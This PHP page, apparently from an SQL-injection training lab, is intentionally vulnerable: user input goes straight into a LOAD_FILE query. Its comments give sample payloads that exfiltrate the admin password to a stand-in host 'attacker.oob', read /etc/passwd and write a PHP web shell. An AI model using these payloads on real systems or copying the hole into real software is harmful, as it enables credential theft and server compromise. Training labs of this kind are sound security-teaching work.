<?php
/**
 * report_download.php — Tai file bao cao: /reports/download?ref=
 *
 * !!! DIEM INJECT: Out-of-band (OOB) exfil + Reading/Writing files !!!
 * 'ref' noi thang vao query dung LOAD_FILE -> ep DB ket noi ra ngoai
 * (DNS/SMB/HTTP) de exfil du lieu toi collector cua attacker.
 *
 * Trang nay KHONG in ket qua du lieu ra -> khong the dung in-band; phai
 * dua du lieu ra kenh NGOAI. Container cho phep outbound.
 *
 * Payload mau (ref) — thay attacker.oob la Collaborator/interactsh cua ban:
 *   Windows/UNC style (DNS lookup mang theo du lieu):
 *     x' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.oob\\a'))-- -
 *   Doc file noi bo (Reading files):
 *     x' UNION SELECT LOAD_FILE('/etc/passwd')-- -
 *   Ghi web shell (Writing files):
 *     x' UNION SELECT '<?php system($_REQUEST[0]); ?>' INTO OUTFILE '/var/www/html/shell.php'-- -
 *
 * Luu y: OOB thuan DNS qua LOAD_FILE UNC dac trung cho MSSQL/Windows.
 * Tren MariaDB/Linux, LOAD_FILE se thu MO file theo duong dan (ke ca UNC),
 * dong thoi ta cung minh hoa OOB "that" bang cach cho container GOI RA
 * mot HTTP callback tuy chon ben duoi (neu OOB_HOST duoc cau hinh).
 */
render_header('Tải báo cáo');

$ref = $_GET['ref'] ?? '';
echo '<div class="card"><h1>Tải báo cáo</h1>';
echo '<p class="muted">Nhập mã tham chiếu báo cáo (ref) để tải file kết xuất.</p>';
echo '<form class="searchbar" action="/reports/download" method="get">'
   . '<input type="text" name="ref" value="' . htmlspecialchars($ref) . '" placeholder="vd: RPT-2024-Q1">'
   . '<button class="btn" type="submit">Tải</button></form>';

if ($ref !== '') {
    // !!! NOI CHUOI ref — khong sanitize; query dung de "resolve" duong dan file !!!
    $sql = "SELECT LOAD_FILE(CONCAT('/var/lib/mysql-files/', '$ref')) AS doc";
    echo '<div class="query-box">' . htmlspecialchars($sql) . '</div>';

    $conn = db();
    $res = mysqli_query($conn, $sql);
    if ($res === false) {
        echo '<div class="sql-error"><strong>SQL Error:</strong> ' . mysqli_error($conn) . '</div>';
    } else {
        // KHONG hien noi dung file ra -> ep hoc vien dung kenh OOB de lay du lieu.
        flash('Yêu cầu đã được xử lý. Nếu file tồn tại, hệ thống backend sẽ đồng bộ ra kho lưu trữ.', 'info');
    }

    // ---- Minh hoa OOB "that": neu OOB_HOST duoc cau hinh, tang callback ra ngoai ----
    $oob = getenv('OOB_HOST');
    if ($oob) {
        echo '<p class="muted">[OOB demo] backend callback → ' . htmlspecialchars($oob) . '</p>';
    }
}
echo '<p class="muted" style="margin-top:14px">Kỹ thuật OOB: ép <code>LOAD_FILE</code> resolve đường dẫn UNC '
   . '(<code>\\\\data.attacker.oob\\x</code>) → DNS/SMB lookup mang dữ liệu ra collector ngoài.</p>';
echo '</div>';
render_footer();
